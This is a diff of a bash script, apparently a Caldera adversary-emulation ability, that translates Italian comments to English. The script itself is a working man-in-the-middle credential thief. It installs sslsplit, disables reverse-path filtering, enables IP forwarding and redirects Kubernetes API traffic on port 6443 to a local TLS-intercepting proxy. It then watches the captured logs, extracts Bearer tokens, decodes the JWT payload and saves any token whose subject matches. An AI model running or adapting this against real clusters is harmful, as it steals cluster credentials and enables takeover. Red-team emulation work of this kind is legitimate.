@@ -15,9 +15,10 @@ IPAPI=$(dig +short $UPSTREAM_HOST A)
 
 cleanup() {
   echo "[*] Cleanup..."
-  /opt/caldera/common/remove-pids.sh "$PIDFILE" || echo "[WARN] remove-pids fallita" >&2
+  /opt/caldera/common/remove-pids.sh "$PIDFILE" || echo "[WARN] remove-pids failed" >&2
   iptables -t nat -D PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT" 2>/dev/null || true
   [[ -n "${SSLPID:-}" ]] && kill "$SSLPID" 2>/dev/null || true
+  exit 0
 }
 trap cleanup EXIT
 
@@ -25,12 +26,12 @@ trap cleanup EXIT
 apt update >/dev/null 2>&1 && apt install -y sslsplit inotify-tools jq iptables iproute2 ca-certificates >/dev/null 2>&1
 mkdir -p $LOGDIR
 
-# 2) Modifica ip status
+# 2) Modification ip status
 sysctl -w net.ipv4.conf.all.rp_filter=0
 sysctl -w net.ipv4.conf."$IFACE".rp_filter=0
 sysctl -w net.ipv4.ip_forward=1
 
-# 3) REDIRECT del traffico TCP al VIP:6443 verso la porta locale 6443 (proxy)
+# 3) REDIRECT TCP traffic directed to VIP:6443 to local port 6443 (proxy)
 if ! iptables -t nat -C PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT" 2>/dev/null; then
   iptables -t nat -A PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT"
 fi
@@ -52,18 +53,18 @@ SSLPID=$!
 
 inotifywait -mq -e create "$LOGDIR" | while read -r _ _ file; do
   f="$LOGDIR/$file"
-  # piccola attesa perché sslsplit scrive in append
+  # small wait - sslsplit writes in append
   sleep 0.3
 
-  # 1) prendi l'header Authorization (case-insensitive)
+  # 1) takes Authorization header (case-insensitive)
   auth_line="$(awk 'tolower($1)=="authorization:" {for(i=2;i<=NF;i++) printf "%s ", $i; print ""; exit}' "$f" 2>/dev/null || true)"
   [[ -z "$auth_line" ]] && continue
 
-  # 2) isola il token (togli "Bearer ")
+  # 2) takes only token (remove "Bearer ")
   tok="$(printf '%s' "$auth_line" | grep -Eo "$TOKEN_RE" | sed -E 's/^[Bb]earer[[:space:]]+//; s/[[:space:]]+$//; q' || true)"
   [[ -z "$tok" ]] && continue
 
-  # 3) decodifica payload (base64url → json)
+  # 3) decodes payload (base64url → json)
   IFS='.' read -r _ payload _ <<< "$tok"
   payload_json="$(printf '%s' "$payload" \
     | tr '_-' '/+' \
@@ -71,16 +72,16 @@ inotifywait -mq -e create "$LOGDIR" | while read -r _ _ file; do
     | base64 -d 2>/dev/null || true)"
   [[ -z "$payload_json" ]] && continue
 
-  # 4) verifica frase nel JSON (oppure su .sub se preferisci)
+  # 4) verify string in JSON (or on .sub)
   if echo "$payload_json" | grep -q -- "$REQUIRED_SUBSTR"; then
     printf '%s\n' "$tok" > "$OUTPUT_PATH"
-    echo "[*] Token salvato (match su JSON) → $OUTPUT_PATH"
+    echo "[*] Token saved (match on JSON) → $OUTPUT_PATH"
     exit 0
   else
     sub="$(echo "$payload_json" | jq -r '.sub // empty' 2>/dev/null || true)"
     if [[ -n "$sub" && "$sub" == *"$REQUIRED_SUBSTR"* ]]; then
       printf '%s\n' "$tok" > "$OUTPUT_PATH"
-      echo "[*] Token salvato (match su .sub) → $OUTPUT_PATH"
+      echo "[*] Token saved (match on .sub) → $OUTPUT_PATH"
       exit 0
     fi
   fi
